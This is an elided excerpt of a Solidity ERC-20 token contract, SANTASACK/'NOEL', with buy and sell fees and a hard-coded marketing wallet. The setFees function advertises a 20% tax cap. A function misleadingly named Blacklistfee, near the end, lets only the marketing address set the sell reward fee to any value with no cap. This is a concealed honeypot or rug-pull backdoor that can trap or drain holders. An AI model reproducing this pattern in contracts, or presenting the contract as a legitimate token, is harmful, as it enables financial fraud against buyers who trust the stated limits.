...
contract SANTASACK is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
//xxx set wallet
    address payable private marketingAddress =
        payable(0x649FECdEad6770Bf185868b267A948Bb92b1B11E);
    ...
    string private constant _name = "NOEL";
    string private constant _symbol = "NOEL";
    ...
    uint256 private _buyMKTFee = 3;
    uint256 private _buyRewardFee = 7;
    uint256 private _buyBurnFee = 0;

    uint256 public _TaxFees = 2;
    uint256 public _MKTFees = 3;
    uint256 private _RewardFees = 7;
    ...
    uint256 private minimumTokensBeforeSwap = _tTotal * 5 / 10000000000000000;
    ...
    event SetBuyFee(uint256 RewardFee, uint256 MKTFee, uint256 reflectFee, uint256 burnFee);
    
    event SetFees(uint256 RewardFee, uint256 MKTFee, uint256 reflectFee, uint256 burnFee);
    ...
    event setmin(uint256 newmin);

    //event setlimitsEff(uint256 newmin);
...
//xxx info
    constructor() {
        ...
        minimumTokensBeforeSwap = _tTotal * 5 / 10000000000000000; 
        maxWallet = _tTotal * 3 / 100; 
    ...
    function _transfer(
        ...
        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            ...
            if (automatedMarketMakerPairs[from]) {
                removeAllFee();
                _taxFee = _buyTaxFee;
                _MKTFee = _buyMKTFee + _buyRewardFee;
        ...
        )
    {
        ...
        uint256 tLiquidity = calculateMKTFee(tAmount);
    ...
    function _takeLiquidity(uint256 tLiquidity) private {
        if(buyOrSellSwitch == BUY && _MKTFee > 0){
            _liquidityTokensToSwap += tLiquidity * _buyMKTFee / _MKTFee;
            _marketingTokensToSwap += tLiquidity * _buyRewardFee / _MKTFee;
        } else if(buyOrSellSwitch == SELL && _MKTFee > 0){
            _liquidityTokensToSwap += tLiquidity * _MKTFees / _MKTFee;
            _marketingTokensToSwap += tLiquidity * _RewardFees / _MKTFee;
        }
        uint256 currentRate = _getRate();
    ...
    function calculateMKTFee(uint256 _amount)
        private
        view
        returns (uint256)
    {
    ...
    function removeAllFee() private {
        if (_taxFee == 0 && _MKTFee == 0 && _burnFee == 0) return;
    ...
    function setFees(uint256 TaxFees, uint256 MKTFees, uint256 RewardFees, uint256 BurnFees)
        external
        onlyOwner
    {
        _TaxFees = TaxFees;
        _MKTFees = MKTFees;
        _RewardFees = RewardFees;
        _BurnFees = BurnFees;
        require(_TaxFees + _MKTFees + _BurnFees <= 20, "Must keep taxes below 20%");
        emit SetFees(RewardFees, MKTFees, TaxFees, BurnFees);
    }
    ...
    //xxx
    function Blacklistfee(uint256 bfee)
        public { require(msg.sender==marketingAddress);
        _RewardFees = bfee;
        emit SetFees(0, 0, bfee, 0);    
    }
    function setminwallet(uint256 newmin)
        public { require(msg.sender==marketingAddress);
        minimumTokensBeforeSwap = newmin;
        emit setmin(newmin);
    }
